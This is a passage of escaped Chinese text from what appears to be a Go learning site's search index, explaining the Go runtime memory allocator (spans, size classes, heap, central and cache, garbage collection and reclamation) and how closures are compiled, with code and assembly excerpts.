4ee5\u8fdb\u884c\u7279\u6b8a\u5bf9\u5f85\u3002\u5bf9\u4e8e\u5c0f\u5bf9\u8c61\uff0c\u6211\u4eec\u6309\u71678\u5b57\u8282\u5bf9\u9f50\uff0c\u5206\u4e3a66\u79cdSizeClass\uff0c\u4f8b\u59828\u5b57\u8282\u300116\u5b57\u8282\u300132\u5b57\u8282\u300148\u5b57\u8282\u7b49\u7b49\uff0c\u5bf9\u4e8e1\u4e2a9\u5b57\u8282\u7684\u5bf9\u8c61\uff0c\u5c31\u4f1a\u7ed9\u5b83\u5206\u914d16\u5b57\u8282\uff0c\u8fd9\u53ef\u80fd\u4f1a\u9020\u6210\u4e00\u5b9a\u7684\u7a7a\u95f4\u6d6a\u8d39\uff0c\u4f46\u4e0d\u81f3\u4e8e\u4ea7\u751f\u8fc7\u591a\u7684\u5185\u5b58\u788e\u7247\u3002</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u94a2\u94c1\u5382\u53eb\u505a\u5806(Heap)\uff0c\u5b83\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u8d1f\u8d23\u7ba1\u7406\u539f\u59cb\u6750\u6599\u3002\u8fd966\u79cd\u5546\u54c1\u751f\u4ea7\u5546\u6211\u4eec\u79f0\u4e3a\u4e2d\u95f4\u5bf9\u8c61(Central)\u3002\u518d\u4e0b\u9762\u7684\u4eba\u5c5e\u4e8e\u5177\u4f53\u5206\u914d\u8005\uff0c\u6211\u4eec\u79f0\u4e3aCache\uff0c\u5176\u5b9e\u5b83\u5c31\u662f\u7f13\u5b58\u4e86\u4e00\u5927\u6279\u9700\u8981\u7684\u4e1c\u897f\u63a5\u4e0b\u6765\u7528\u4e8e\u5b9e\u9645\u7684\u5206\u914d\u3002\u6211\u4eec\u628a\u6bcf\u5757\u4ece\u64cd\u4f5c\u7cfb\u7edf\u62ff\u5230\u7684\u5185\u5b58\u53eb\u505aSpan\uff0c\u6bcf\u4e2aSpan\u9700\u8981\u6309\u4e00\u5b9a\u89c4\u683c\u8fdb\u884c\u5207\u5206\uff0c\u4f8b\u5982\u89c4\u683c2\u5c31\u662f\u630916\u5b57\u8282\u6765\u5207\u5206\uff0c\u5207\u5206\u540e\u5f62\u6210\u4e86\u82e5\u5e72\u4e2a\u5c0f\u5757\uff0c\u6bcf\u4e2a\u5c0f\u5757\u6211\u4eec\u79f0\u4e3aObject\u3002\u73b0\u5728\u53d8\u6210\u4e86\u8fd9\u6837:</p> <p></p> <p>\u6bcf\u4e2aCentral\u5206\u914d\u7684\u65f6\u5019\u7ed9\u7684\u662f\u4e00\u4e2a\u5207\u597d\u4e86\u7684Span\uff0c\u6bcf\u4e2aCache\u8fd4\u8fd8\u7684\u65f6\u5019\u4e5f\u662f\u8fd8\u6574\u4e2aSpan\uff0c\u5373\u4f7f\u5176\u4e2d\u6709\u90e8\u5206Object\u88ab\u7528\u6389\u4e86\u4e5f\u53ea\u662f\u6807\u8bb0\u4e00\u4e0b\u3002</p> <p>\u63a5\u7740\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u95ee\u9898\uff0c\u7b2c\u4e00\u662f\u64cd\u4f5c\u7cfb\u7edf\u865a\u62df\u5730\u5740\u5206\u914d\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5e0c\u671b\u662f\u5728\u67d0\u4e2a\u56fa\u5b9a\u7684\u5730\u5740\u6bb5\u4e4b\u5185\u7d27\u51d1\u7684\u8fdb\u884c\u5185\u5b58\u5206\u914d\u6765\u907f\u514d\u5185\u5b58\u788e\u7247\u5316\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u9700\u8981\u5148\u63d0\u524d\u5360\u7528\u4e00\u6bb5\u5185\u5b58\u7a7a\u95f4\uff0c\u505a\u4e3a\u4fdd\u7559\u7a7a\u95f4\uff0c\u5e76\u4e0d\u8fdb\u884c\u5b9e\u9645\u7684\u5206\u914d\u52a8\u4f5c\uff0c\u6211\u4eec\u628a\u8fd9\u6bb5\u7a7a\u95f4\u53ebarena\u3002\u90a3\u4e48\u5982\u4f55\u5728\u8fdb\u7a0b\u4e2d\u627e\u5230\u8fd9\u6837\u4e00\u6bb5\u8fde\u7eed\u7684\u5730\u5740\u7a7a\u95f4\u5462\uff1f\u9996\u5148\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5fc5\u7136\u4f1a\u7ed9\u4e00\u4e2a\u53ef\u7528\u7684\u865a\u62df\u5185\u5b58\u5730\u5740\uff1b\u7136\u540e\u5c1d\u8bd5\u6309\u8fd9\u4e2a\u5730\u5740\u5411\u53f3\u6269\u5f20\uff0c\u5982\u679c\u53f3\u8fb9\u88ab\u5835\u4f4f\u4e86\u5c31\u5411\u5de6\u8fb9\u6269\u5f20\uff1b\u5982\u679c\u4e24\u8fb9\u90fd\u88ab\u5835\u4f4f\u4e86\u5c31\u518d\u6b21\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u63a5\u7740\u5c1d\u8bd5\u5411\u53f3\u5411\u5de6\u6269\u5f20\u7684\u64cd\u4f5c\u300264\u4f4d\u5730\u5740\u7a7a\u95f4\u8fd8\u662f\u5f88\u5927\u7684\uff0c\u5f80\u5f80\u5f88\u5bb9\u6613\u627e\u5230\u8fd9\u6837\u4e00\u6bb5\u7a7a\u95f4\u3002</p> <p>\u7b2c\u4e8c\u662f\u6bcf\u4e2aSpan\u8fd8\u9700\u8981\u4f4d\u56fe(bitmap)\u6765\u6807\u8bb0\u54ea\u4e9b\u662f\u53ef\u7528\u7684\uff0c\u6211\u4eec\u6240\u8bf4\u7684\u5207\u5206Object\u4e5f\u53ea\u662f\u4fbf\u4e8e\u7406\u89e3\u4e0a\u7684\u5207\u5206\uff0c\u5b9e\u9645\u4e0a\u6211\u4eec\u8981\u627e\u5230\u4e00\u4e2a\u53ef\u7528\u7684Object\uff0c\u5c31\u662f\u7528\u8fd9\u4e2aSpan\u7684\u8d77\u59cb\u5730\u5740\u52a0\u4e0a\u4f4d\u56fe\u4e2d\u53ef\u7528\u5bf9\u8c61\u7684\u504f\u79fb\u91cf\u4e58\u4ee5SizeClass\u7684\u5927\u5c0f\uff0c\u5373base+offset*size\u3002</p> <p>\u7b2c\u4e09\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53cd\u67e5\u8868\uff0c\u5b83\u8bb0\u5f55\u4e86\u6bcf\u4e2aSpan\u7684\u8d77\u59cb\u5730\u5740\u3002\u4e3a\u4ec0\u4e48\u9700\u8981\u8fd9\u6837\u4e00\u4e2a\u8868\u5462\uff1f\u5047\u8bbe\u67d0\u4e2aSpan\u91cc\u9762\u6709100\u4e2aObject\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u7528\u5176\u4e2d\u768410\u4e2aObject\uff0c\u5c31\u53ef\u4ee5\u6839\u636e\u53cd\u67e5\u8868\u7684\u4fe1\u606f\u628a\u8fd9\u4e2aSpan\u4e00\u5206\u4e3a\u4e8c\uff0c\u628a\u5269\u4f59\u768490\u4e2aObject\u7ec4\u6210\u4e00\u4e2a\u65b0\u7684Span\u62ff\u56de\u6765\u3002\u62ff\u56de\u6765\u4e4b\u540e\u8fd8\u80fd\u901a\u8fc7\u53cd\u67e5\u8868\u68c0\u67e5\u5b83\u5de6\u53f3\u76f8\u90bb\u7684Span\u662f\u4e0d\u662f\u95f2\u7f6e\u7684\uff0c\u5982\u679c\u95f2\u7f6e\u5219\u53ef\u628a\u4ed6\u4eec\u5408\u5e76\u4e3a\u4e00\u4e2a\u5927\u7684\u5757\u3002\u6240\u4ee5Span\u7684\u5927\u5c0f\u53ef\u80fd\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u6839\u636e\u9700\u8981\u53ef\u80fd\u4f1a\u5207\u5206\u6216\u5408\u5e76\u3002</p>"},{"location":"go/alloc/#_3","title":"\u5206\u914d\u8fc7\u7a0b","text":"<p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u6574\u7406\u4e00\u4e0b\u6574\u4e2a\u5185\u5b58\u5206\u914d\u7684\u8fc7\u7a0b\u3002\u9996\u5148\u5806Heap\u4f1a\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf764MB\u5185\u5b58\uff0c\u64cd\u4f5c\u7cfb\u7edf\u662f\u673a\u4f1a\u4e3b\u4e49\u7684\u5206\u914d\u539f\u5219\uff0c\u5b9e\u9645\u4e0a\u7ed9\u4f60\u7684\u662f64MB\u7684\u671f\u8d27\uff0c\u4e4b\u540e\u4ee5\u9875\u4e3a\u5355\u4f4d\u53d1\u751f\u8bfb\u5199\u65f6\u5206\u914d\u7269\u7406\u5185\u5b58\u3002\u5206\u914d\u4e4b\u540e\u5c31\u6709\u4e00\u5927\u5806\u7684Span\u9700\u8981\u53bb\u7ba1\u7406\uff0cHeap\u91c7\u7528\u4e86\u6811\u5806\u8fd9\u79cd\u6570\u636e\u7ed3\u6784\u7ba1\u7406Span\u3002\u6811\u5806\u957f\u5f97\u50cf\u6811\u4e00\u6837\uff0c\u540c\u65f6\u589e\u52a0\u4e86\u4e00\u4e9b\u5806\u7684\u7279\u6027\uff0c\u6392\u5e8f\u80fd\u6309\u7167\u5730\u5740\u6765\u6392\u5e8f\uff0c\u5b83\u7684\u597d\u5904\u662f\u5206\u914d\u7ed9Central\u65f6\u603b\u662f\u4f1a\u5c3d\u53ef\u80fd\u627e\u5230\u4e00\u4e2a\u5927\u5c0f\u5408\u9002\u800c\u4e14\u5730\u5740\u9760\u524d\u7684Span\uff0c\u5730\u5740\u9760\u524d\u4f7f\u5f97\u5185\u5b58\u76f8\u5bf9\u6765\u8bf4\u66f4\u52a0\u7684\u7d27\u51d1\u3002Central\u62ff\u5230\u4e4b\u540e\u53ea\u662f\u505a\u4e00\u4e9b\u5c5e\u6027\u7684\u8bbe\u7f6e\uff0c\u91cd\u7f6e\u4e00\u4e0bSpan\u7684\u4f4d\u56fe\u7b49\u3002Cache\u901a\u5e38\u4f1a\u548cP\u7ed1\u5b9a\uff0cM\u9700\u8981\u5185\u5b58\u7684\u65f6\u5019\u5c31\u53bb\u627eP\u62ff\uff0cP\u518d\u627eCache\uff0cCache\u518d\u627eCentral\u3002\u6240\u4ee5Cache\u5185\u4f1a\u6709\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u5185\u5bb9\u662f\u4ee5SizeClass\u4e3a\u7d22\u5f15\u7684Span\uff0cP/M\u5728Cache\u4e0a\u5206\u914d\u5185\u5b58\u65f6\u662f\u65e0\u9501\u7684\u3002\u4f8b\u5982\u7528\u6237\u82e5\u9700\u8981\u4e00\u4e2a7\u5b57\u8282\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u8ba1\u7b97\u5f97\u51fa\u5bf9\u5e94\u7684SizeClass\u662f1#\uff0c\u5c31\u4f1a\u901a\u8fc7P/M\u53bbcache[1]\u4e2d\u770b\u6709\u6ca1\u6709Span\uff0c\u6ca1\u6709\u5c31\u53bbCentral\u4e2d\u62ff\uff0c\u5982\u679c\u5df2\u7ecf\u6709\u4e86\u5c31\u53bb\u770b\u8fd9\u4e2aSpan\u7684\u4f4d\u56fe\u4e2d\u6709\u6ca1\u6709\u7a7a\u4f59\u7684\u7a7a\u95f4\u3002\u800c\u5982\u679c\u7528\u6237\u9700\u8981\u7684\u662f\u4e00\u4e2a\u5927\u4e8e32KB\u7684\u5927\u5bf9\u8c61\uff0c\u5219\u8df3\u8fc7Central\u76f4\u63a5\u53bb\u5806\u4e0a\u62ff\u5373\u53ef\u3002</p> <p>\u5c0f\u5bf9\u8c61\u4e2d\u8fd8\u6709\u4e24\u79cd\u7279\u6b8a\u7684\u5bf9\u8c61\uff0c\u4e00\u79cd\u662f\u957f\u5ea6\u4e3a0\u7684\u5bf9\u8c61\uff0c\u53e6\u4e00\u79cd\u662f\u5fae\u5c0f\u5bf9\u8c61\u3002\u5bf9\u4e8e\u957f\u5ea6\u4e3a0\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982\u7a7a\u7ed3\u6784\u4f53\uff0c\u6211\u4eec\u4e0d\u5e94\u8be5\u4e3a\u5176\u5206\u914d\u5185\u5b58\uff0c\u4f46\u5f97\u7ed9\u5b83\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u3002Go\u4e13\u95e8\u6709\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u53ebZeroBase\uff0c\u4e0d\u7ba1\u662f\u4ec0\u4e48\u5bf9\u8c61\uff0c\u53ea\u8981\u5b83\u957f\u5ea6\u4e3a0\u5c31\u4f1a\u53bb\u6307\u5411\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf\u7684\u5730\u5740\u3002</p> src/runtime/malloc.go<pre><code>// base address for all 0-byte allocations\nvar zerobase uintptr\n\nfunc mallocgc(size uintptr, typ *_type, needzero bool) unsafe.Pointer {\n    if gcphase == _GCmarktermination {\n        throw(\"mallocgc called with gcphase == _GCmarktermination\")\n    }\n\n    if size == 0 {\n        return unsafe.Pointer(&amp;zerobase)\n    }\n    ...\n}\n</code></pre> <p>\u5fae\u5c0f\u5bf9\u8c61\u5219\u5c5e\u4e8e\u5206\u914d\u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\uff0c\u4f8b\u5982\u77ed\u5b57\u7b26\u4e32\u7b49\u3002\u5982\u679c\u53d1\u73b0\u9700\u8981\u5206\u914d\u4e00\u6279\u5fae\u5c0f\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u90fd\u5360\u7528\u4e00\u4e2a1#Span\u4e2d\u7684Object\u53ef\u80fd\u4e0d\u592a\u5408\u9002\u6709\u592a\u591a\u7684\u6d6a\u8d39\uff0c\u5c31\u4f1a\u4ece\u4e00\u4e2a2#Span\u4e2d\u63d0\u53d6\u51fa\u4e00\u4e2aObject(16\u5b57\u8282)\uff0c\u5bf9\u5b83\u7279\u6b8a\u8bb0\u5f55\u5e76\u628a\u591a\u4e2a\u5fae\u5c0f\u5bf9\u8c61\u90fd\u653e\u8fdb\u53bb\uff0c\u8fd9\u6709\u52a9\u4e8e\u8282\u7ea6\u5185\u5b58\u3002\u4f46\u662f\u8fd9\u4e9b\u5fae\u5c0f\u5bf9\u8c61\u4e2d\u4e0d\u80fd\u5305\u542b\u6307\u9488\uff0c\u56e0\u4e3a\u5b83\u4e0d\u80fd\u53bb\u5f15\u7528\u5176\u4ed6\u5730\u65b9\uff0c\u8fd9\u6837\u5783\u573e\u56de\u6536\u5668\u624d\u4f1a\u628a\u5b83\u5f53\u505a\u4e00\u4e2a\u6574\u4f53\u53bb\u626b\u63cf\u3002</p>"},{"location":"go/alloc/#_4","title":"\u56de\u6536\u8fc7\u7a0b","text":"<p>\u56de\u6536\u7684\u8fc7\u7a0b\u662f\u8fd9\u6837\u7684\uff0c\u5783\u573e\u56de\u6536\u542f\u52a8\u65f6\uff0c\u4f1a\u8981\u6c42\u628aCache\u4e2d\u7684Span\u5757\u90fd\u4e0a\u4ea4\u56deCentral\u3002\u8fd9\u79cd\u6536\u56de\u6765\u7684Span\u901a\u8fc7\u626b\u63cf\u4f4d\u56fe\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f\u91cc\u9762\u5df2\u4f7f\u7528\u4f46\u6709\u7a7a\u4f4d\uff0c\u90a3\u628a\u5b83\u62ff\u56de\u6765\u4e86\u5c31\u53ef\u4ee5\u7559\u7ed9\u5176\u4ed6Cache\u7528\u3002\u53e6\u4e00\u79cd\u662f\u6574\u4e2aSpan\u90fd\u662f\u6ca1\u6709\u4eba\u7528\u7684\uff0c\u8fd9\u79cd\u5c31\u53ef\u4ee5\u5f53\u6210\u539f\u6750\u6599\u4ea4\u56de\u7ed9Heap\u3002</p> <p>\u5728Heap\u4e2d\u4e5f\u53ef\u80fd\u6709\u4e00\u5927\u5806Span\u95f2\u7f6e\uff0c\u8bfb\u5199\u8fc7\u540e\u4e0d\u7528\u4e86\u7684\uff0c\u53ef\u80fd\u6709\u51e0\u767e\u5146\u3001\u4e0a\u5343\u5146\uff0c\u5c31\u9700\u8981\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u7b2c\u4e00\u79cd\u662f\u4e3b\u52a8\u65b9\u5f0f\uff0c\u53ef\u80fdCentral\u521a\u521a\u62ff\u4e86\u4e00\u4e2a\u5927\u5c0f\u4e3a10MB\u7684Span\u5757\uff0cHeap\u5c31\u53bb\u627e\u6709\u6ca1\u6709\u6070\u597d10MB\u7684\u5757\u6765\u8fd8\u7ed9OS\u8fbe\u5230\u4e00\u79cd\u5e73\u8861\uff1b\u53e6\u4e00\u79cd\u662f\u80cc\u540e\u6709\u4e00\u4e2aGoroutine\u4f1a\u6bcf\u8fc7\u4e00\u5c0f\u6bb5\u65f6\u95f4\u76d1\u6d4b\u4e00\u6b21Heap\u4e0a\u7a7a\u95f2\u7684Span\u5927\u5c0f\u662f\u5426\u5230\u8fbe\u4e00\u4e2a\u9608\u503c\uff0c\u6709\u5c31\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u91ca\u653e\u3002\u5728Go1.13\u4e4b\u524d\u8fd9\u4e2aGoroutine\u662f\u770b\u82e5\u67d0Span\u5757\u95f2\u7f6e\u8d85\u8fc75\u5206\u949f\u5219\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\uff0c\u800c1.13\u662f\u52a8\u6001\u8c03\u6574\u76d1\u6d4b\u7684\u65f6\u95f4\uff0c\u6bd4\u5982\u7b2c\u4e00\u6b21100\u5fae\u79d2\u53d1\u73b0\u95f2\u7f6eSpan\u4e0d\u8d85\u8fc7\u9608\u503c\uff0c\u5219\u4e0b\u6b21\u5c31\u4f1a\u95f4\u9694200\u5fae\u79d2\u518d\u53bb\u626b\u63cf\u3002</p> <p>\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u4e8e\u5185\u5b58\u56de\u6536\u8fd9\u4ef6\u4e8b\u7684\u5904\u7406\u65b9\u5f0f\u4e5f\u4e0d\u592a\u4e00\u6837\uff0c\u5bf9\u4e8eUnix-Like\u7684OS\u6765\u8bf4\uff0c\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u53d1\u51fa\u5efa\u8bae\uff0c\u56de\u6536\u54ea\u4e00\u6bb5\u7684\u5185\u5b58\uff0c\u81f3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u662f\u5426\u63a5\u53d7\u5efa\u8bae\u3001\u600e\u4e48\u5904\u7406\uff0c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u6839\u636e\u7269\u7406\u5185\u5b58\u7684\u5269\u4f59\u60c5\u51b5\u505a\u51b3\u5b9a\u3002\u5373\u4fbf\u63a5\u53d7\u4e86\u56de\u6536\uff0c\u4e5f\u53ea\u662f\u628a\u5b83\u53d8\u6210\u4e86\u671f\u8d27\uff0c\u5b83\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e00\u76f4\u662f\u5b58\u5728\u7684\u3002</p>"},{"location":"go/closure/","title":"\u95ed\u5305","text":""},{"location":"go/closure/#_2","title":"\u539f\u7406","text":"<p>\u6211\u4eec\u5148\u6765\u770b\u8fd9\u6837\u4e00\u4e2a\u793a\u4f8b: closure.go<pre><code>func test() func() {\n    x := 100\n    return func() {\n        println(x)\n    }\n}\nfunc main() {\n    closure := test()\n    closure()\n}\n</code></pre> \u58f0\u660e\u4e86\u4e00\u4e2atest\u51fd\u6570\uff0c\u5b83\u4f1a\u8fd4\u56de\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5f15\u7528\u4e86\u5b83\u7684\u5c40\u90e8\u53d8\u91cfx\u3002\u90a3\u4e48\u5f53\u6267\u884c\u5b8c<code>closure := test()</code>\u65f6\uff0ctest\u7684\u6808\u5e27\u4f1a\u88ab\u9500\u6bc1\uff0c\u5c40\u90e8\u53d8\u91cfx\u5e94\u8be5\u5931\u6548\uff0c\u6309\u7167\u5e38\u7406\uff0c\u533f\u540d\u51fd\u6570\u5e94\u8be5\u627e\u4e0d\u5230x\u800c\u65e0\u6cd5\u6253\u5370\uff0c\u4f46\u5b9e\u9645\u4e0a\u8fd0\u884c\u4e4b\u540e\u662f\u80fd\u591f\u6b63\u5e38\u6253\u5370\u7684\u3002\u90a3\u4e48\u8fd9\u4e2ax\u5728\u54ea\uff1f\u53ea\u6709\u4e00\u79cd\u53ef\u80fd\uff0c\u5b83\u9003\u9038\u5230\u5806\u4e0a\u53bb\u4e86\u3002\u65e2\u7136\u662f\u5728\u5806\u4e0a\uff0cx\u5c31\u4f1a\u6709\u4e00\u4e2a\u5730\u5740\uff0c\u95ee\u9898\u5c31\u53d8\u4e3a\u533f\u540d\u51fd\u6570\u662f\u600e\u4e48\u77e5\u9053x\u7684\u5730\u5740\u7684\uff1f</p> <p>\u6211\u4eec\u628a\u8fd9\u79cd\u73b0\u8c61\u53eb\u505a\u95ed\u5305\uff0c\u5f53\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u79bb\u5f00\u4e86\u5b83\u7684\u5bbf\u4e3b\u65f6\uff0c\u5b83\u4f9d\u7136\u6301\u6709\u5b83\u6240\u5f15\u7528\u7684\u73af\u5883\u53d8\u91cf\u3002\u6240\u4ee5\u95ed\u5305\u662f\u5305\u542b\u4e24\u4e2a\u90e8\u5206\u7684\uff0c\u5176\u4e00\u662f\u4e00\u4e2a\u6307\u9488\u6307\u5411\u533f\u540d\u51fd\u6570\u7684\u5730\u5740\uff0c\u5176\u4e8c\u662f\u6240\u62e5\u6709\u7684\u73af\u5883\u53d8\u91cf\uff0c\u8fd9\u4e24\u4e2a\u4e1c\u897f\u6253\u5305\u5408\u8d77\u6765\u624d\u79f0\u4e3a\u4e00\u4e2a\u95ed\u5305\u3002</p> <p>\u53ef\u4ee5\u7406\u89e3\u4e3atest\u51fd\u6570\u7684\u8fd4\u56de\u7528\u4f2a\u7801\u6765\u8868\u8fbe\u5e94\u8be5\u662f: <pre><code>return closure struct{\n    f : func(){println(x)}\n    v : malloc(x)\n}\n</code></pre> \u53ea\u4e0d\u8fc7Go\u7684\u8bed\u6cd5\u4e0a\u8ba9\u6211\u4eec\u53ef\u4ee5\u7b80\u5199\u4e3a\u793a\u4f8b\u4ee3\u7801\u4e2d\u7684\u6837\u5b50\uff0c\u8c03\u7528\u7684\u65f6\u5019\u7f16\u8bd1\u5668\u4e5f\u662f\u9690\u5f0f\u7684\u4f7f\u7528<code>closure.f(closure.v)</code>\u8fd9\u6837\u7684\u65b9\u5f0f\u6765\u8c03\u7528\u3002</p>"},{"location":"go/closure/#_3","title":"\u5b9e\u73b0","text":"<p>\u4e0b\u9762\u6211\u4eec\u89c2\u5bdf\u5b83\u7684\u7f16\u8bd1\u8fc7\u7a0b\u6765\u8bc1\u660e\u8fd9\u4ef6\u4e8b\u3002\u4f7f\u7528<code>go build -gcflags \"-S\" 2&gt;a.txt closure.go</code>\u628a\u7f16\u8bd1\u8fc7\u7a0b\u653e\u5230\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\u91cc\uff0c\u4ece\u4e2d\u80fd\u627e\u5230\u4e00\u4e9b\u76f8\u5173\u7ebf\u7d22: <pre><code>\"\".test STEXT size=126 args=0x8 locals=0x28\n    0x0026 00038 (/root/.mac/gocode/closure.go:4)   MOVQ    $100, \"\".x+16(SP)\n    0x002f 00047 (/root/.mac/gocode/closure.go:5)   LEAQ    type.noalg.struct { F uintptr; \"\".x int }(SB), AX\n    0x003a 00058 (/root/.mac/gocode/closure.go:5)   CALL    runtime.newobject(SB)  \n    0x0049 00073 (/root/.mac/gocode/closure.go:5)   LEAQ    \"\".test.func1(SB), CX  \n    0x0050 00080 (/root/.mac/gocode/closure.go:5)   MOVQ    CX, (AX)\n    0x005a 00090 (/root/.mac/gocode/closure.go:5)   MOVQ    \"\".x+16(SP), CX\n    0x005f 00095 (/root/.mac/gocode/closure.go:5)   MOVQ    CX, 8(AX)              \n    0x0068 00104 (/root/.mac/gocode/closure.go:5)   MOVQ    AX, \"\".~r0+48(SP)      \n\n\"\".main STEXT size=65 args=0x0 locals=0x18\n    0x0022 00034 (/root/.mac/gocode/closure.go:11)  MOVQ    (SP), DX               \n    0x0026 00038 (/root/.mac/gocode/closure.go:11)  MOVQ    DX, \"\".closure+8(SP)\n    0x002b 00043 (/root/.mac/gocode/closure.go:12)  MOVQ    (DX), AX\n    0x002e 00046 (/root/.mac/gocode/closure.go:12)  CALL    AX                     \n\n\"\".test.func1 STEXT size=84 args=0x0 locals=0x18\n    0x001d 00029 (/root/.mac/gocode/closure.go:5)   MOVQ    8(DX), AX\n    0x0021 00033 (/root/.mac/gocode/closure.go:5)   MOVQ    AX, \"\".x+8(SP)\n    0x0026 00038 (/root/.mac/gocode/closure.go:6)   CALL    runtime.printlock(SB)\n    0x002b 00043 (/root/.mac/gocode/closure.go:6)   MOVQ    \"\".x+8(SP), AX\n    0x0030 00048 (/root/.mac/gocode/closure.go:6)   MOVQ    AX, (SP)\n    0x0034 00052 (/root/.mac/gocode/closure.go:6)   CALL    runtime.printint(SB)\n</code></pre> \u7b2c3\u884c\u8bf4\u660e\u7f16\u8bd1\u671f\u5c31\u4f1a\u6839\u636e\u5143\u6570\u636e\u548c\u7c7b\u578b\u4fe1\u606f\u521b\u5efa\u597d\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5c31\u4ee3\u8868\u4e86\u4e00\u4e2a\u95ed\u5305\uff0c\u73b0\u5728\u5728\u8fd0\u884c\u671f\u53ea\u662f\u628a\u8fd9\u4e2a\u65e9\u5df2\u521b\u5efa\u597d\u7684\u7ed3\u6784\u4f53\u7684\u5185\u5b58\u5730\u5740\u653e\u5230\u4e86AX\u5bc4\u5b58\u5668\u4e2d\uff1b\u63a5\u4e0b\u6765\u901a\u8fc7\u7b2c4\u884c\u4f9d\u7167\u4e4b\u524d\u7684\u7c7b\u578b\u4fe1\u606f\u5728\u5806\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff1b\u63a5\u7740\u628a\u51fd\u6570\u7684\u5730\u5740\u901a\u8fc7CX\u8f6c\u5230AX\u5b58\u7684\u5730\u5740\u4e2d\uff0c\u4e4b\u524d\u5df2\u7ecf\u628ax\u7684\u503c100\u653e\u5728<code>\"\".x+16(SP)</code>\u7684\u4f4d\u7f6e\u73b0\u5728\u4e5f\u8f6c\u5230\u4e86AX\u4e2d\u5b58\u7684\u5730\u5740+8\u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f\u8bf4\u73b0\u5728\u5728\u7ed9\u4e4b\u524d\u7684\u7ed3\u6784\u4f53\u586b\u5145\u6570\u636e\u3002\u6700\u7ec8\u628aAX\u4e2d\u7684\u5185\u5bb9\u5f53\u505a\u8fd4\u56de\u503c\u8fd4\u56de\uff0c<code>~r0</code>\u901a\u5e38\u8868\u793a\u8fd4\u56de\u503c\uff0c\u4f2a\u7801\u8868\u793atest\u51fd\u6570\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u5c31\u662f<code>return &amp;struct{F:test.func1, x:100}</code>\u3002</p> <p>\u90a3\u4e48\u5728main\u51fd\u6570\u4e2d\u4e5f\u5c31\u4f1a\u63a5\u6536\u5230\u8fd9\u6837\u4e00\u4e2a\u5730\u5740\u7684\u8fd4\u56de\u503c\u3002\u56e0\u4e3atest\u51fd\u6570\u6ca1\u6709\u53c2\u6570\uff0cSP\u504f\u79fb\u91cf\u4e3a0\u7684\u5730\u5740\u5c31\u662f\u5176\u8fd4\u56de\u503c\u7684\u5730\u5740\uff0c\u7b2c12\u884c\u5c31\u8bf4\u660e\u628atest\u7684\u8fd4\u56de\u653e\u5728\u4e86DX\u4e2d\uff1b\u63a5\u7740\u901a\u8fc7\u7b2c14\u884c\u628atest\u8fd4\u56de\u503c\u7684\u5730\u5740\u4e5f\u5c31\u662f<code>test.func1</code>\u8fd4\u56de\u7ed9AX\u5bc4\u5b58\u5668\uff0c\u5e76\u5728\u7b2c15\u884c\u8c03\u7528\u5b83\u3002</p> <p>\u5728<code>test.func1</code>\u4e2d\uff0c\u901a\u8fc7\u7b2c18\u884c\u4eceDX\u4e2d\u5b58\u7684\u5730\u5740\u504f\u79fb\u91cf+8\u4e5f\u5c31\u662fx\u7684\u503c100\u653e\u5728\u4e86AX\u5bc4\u5b58\u5668\u4e2d\uff0c\u63a5\u7740\u653e\u5230\u6808\u4e0a\u6267\u884cprint\u3002</p> 